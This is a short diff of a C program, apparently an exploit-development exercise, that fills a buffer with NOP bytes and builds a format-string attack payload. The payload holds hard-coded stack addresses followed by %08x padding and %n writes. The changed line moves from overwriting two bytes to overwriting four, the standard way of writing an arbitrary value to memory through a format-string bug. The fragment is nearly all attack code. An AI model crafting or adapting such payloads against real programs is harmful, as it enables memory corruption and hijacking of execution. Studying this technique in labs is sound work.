@@ -15,7 +15,7 @@ int main(void)
   memset(buf, 0x90, 50);
 
   //strncpy(buf, "\x50\xfb\xff\xbf%08x%08x%08x%n", 18); 
-  strncpy(buf, "\x50\xfb\xff\xbf\x51\xfb\xff\xbf%08x%08x%76x%n%n", 24);
+  strncpy(buf, "\x3c\xfe\xff\xbf\x3d\xfe\xff\xbf\x3e\xfe\xff\xbf\x3f\xfe\xff\xbf%08x%08x%08x%n%n%n%n", 36);
   //for(i = 0; i < 113; i++) {
     //strncpy(buf+4+(i*4), "%08x", 4); 
   //}
